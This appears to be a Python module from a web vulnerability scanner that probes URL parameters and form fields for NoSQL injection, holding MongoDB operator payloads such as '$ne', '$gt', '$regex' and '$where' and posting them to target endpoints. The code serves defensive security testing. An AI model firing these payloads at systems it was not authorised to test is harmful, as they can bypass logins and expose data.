"""NoSQL Injection Scanner — OWASP A03:2021."""
import re
import json
from core.base_scanner import BaseScanner
from core.logger import vuln

NOSQLI_PAYLOADS = [
    # MongoDB operator injection
    ("' || '1'=='1",     r""),
    ("'; return true; //",r""),
    ("{\"$gt\": \"\"}",   r""),
    ("{\"$ne\": null}",   r""),
    ("{\"$regex\": \".*\"}",r""),
]
# JSON body payloads for POST endpoints
JSON_PAYLOADS = [
    {"$gt": ""},
    {"$ne": None},
    {"$regex": ".*"},
    {"$where": "1==1"},
]
SUCCESS_RE = re.compile(
    r"welcome|dashboard|logged.?in|logout|profile|admin|home",
    re.IGNORECASE,
)
ERROR_RE = re.compile(
    r"mongo|nosql|bson|eval|objectid|castError|ValidationError",
    re.IGNORECASE,
)
SKIP_FIELD_RE = re.compile(r"token|csrf|nonce|_method|authenticity", re.IGNORECASE)


class NoSQLiScanner(BaseScanner):
    MODULE_NAME = "nosqli"
    OWASP_CATEGORY = "A03:2021 - Injection"

    def scan(self, urls: list) -> list:
        findings = []
        tested = set()

        for url in urls:
            for param in self.get_url_params(url):
                key = f"url:{url}:{param}"
                if key in tested:
                    continue
                tested.add(key)
                for payload, _ in NOSQLI_PAYLOADS:
                    resp = self.session.get(self.inject_param(url, param, payload))
                    if resp and (SUCCESS_RE.search(resp.text) or ERROR_RE.search(resp.text)):
                        findings.append(self.make_finding(
                            url=url, param=param, payload=payload,
                            evidence=resp.text[:200],
                            severity="CRITICAL",
                            description=f"NoSQLi in URL param '{param}'.",
                            remediation="Validate and sanitize all input. Use typed query builders.",
                        ))
                        vuln(f"  [VULN] NoSQLi @ {url} param={param}")
                        break

            for form in self.get_forms(url):
                for field in form["inputs"]:
                    if SKIP_FIELD_RE.search(field):
                        continue
                    key = f"form:{form['url']}:{field}"
                    if key in tested:
                        continue
                    tested.add(key)
                    for jp in JSON_PAYLOADS:
                        injected = dict(form["inputs"])
                        injected[field] = jp
                        resp = self.session.post(form["url"], json=injected)
                        if resp and (SUCCESS_RE.search(resp.text) or ERROR_RE.search(resp.text)):
                            findings.append(self.make_finding(
                                url=form["url"], param=field, payload=str(jp),
                                evidence=resp.text[:200],
                                severity="CRITICAL",
                                description=f"NoSQLi via JSON form field '{field}'.",
                                remediation="Validate and sanitize all input.",
                            ))
                            vuln(f"  [VULN] NoSQLi (form) @ {form['url']} field={field}")
                            break
        return findings
